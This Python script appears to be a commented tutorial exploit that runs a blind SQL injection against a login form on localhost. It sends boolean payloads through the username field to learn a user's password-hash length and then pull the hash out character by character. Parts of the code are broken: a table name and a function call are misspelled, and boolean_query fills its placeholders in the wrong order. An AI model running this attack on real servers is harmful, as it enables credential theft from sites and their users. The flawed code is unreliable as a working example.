# exploiting a web server using SQL injection

import requests

total_queries = 0       # total number of queries that we will make to perform the injection
charset = "0123456789abcdef"
target = "http://127.0.0.1:5000" # suppose we have a login panel at the given link at localhost
needle = "Welcome back"

# creating a function for actually creating an injected query and check whether that query succeeded or failed
# performs injected query to web application, and identify form the response, whether the request was valid or not
def injected_query(payload):   # this function takes some payload as an input, then sends the payload to the end point of the web application, vulnerable to SQLi
	global total_queries
	r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "password": "password"})   # get the response on making the given request
	total_queries += 1
	return needle.encode() not in r.content    # this is a blind SQLi which means we need to check whether our needle in the response and we can use it as reference to know that our SQLi has succeded or failed

# function to create a boolean query
# identifies at a certain offset, whether the character is valid or invalid
def boolean_query(offset, user_id, character, operator=">"):       # this function is for actually 
	payload = "(select hex(substr(password, {}, 1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, character, operator)
	return injected_query(payload)

# funtion to check if the user is valid or not (not important in real world)
# identifies whethe the user's id is valid or invalid
def invalid_user(user_id):
	payload = "(select id from uesr where id = {}) >= 0".format(user_id)
	return injected_qurey(payload)

# understand the length of user's password hash (by making a guess)
def password_length(user_id):
	i = 0
	while True:
		payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
		if not injected_query(payload):
			return i
		i += 1

# extract the user's actual hash
# extracts a user's password hash based on the character set, their id and the length of their id, which will iterate over each index in the user's password hash and extract the valid character
def extract_hash(charset, user_id, password_length):
	found = ""
	for i in range(0, password_length):
		for j in range(len(charset)):
			if boolean_query(i, user_id, charset[j]):
				found += charset[j]
				break
	return found

# function to know how many queries we have taken to perfom the injection
# for debugging and logging, it gives how many queries were taken
def total_queries_taken():
	global total_queries
	print("\t\t[!] {} total queries!".format(total_queries))
	total_queries = 0

while True:
	try:
		user_id = input("> Enter a user ID to extract the password hash: ")
		if not invalid_user(user_id):
			user_password_length = password_length(user_id)
			print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
			total_queries_taken()
			print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
			total_queries_taken()
		else:
			print("\t[X] User {} does not exist!".format(user_id))
	except KeyboardInterrupt:
		break
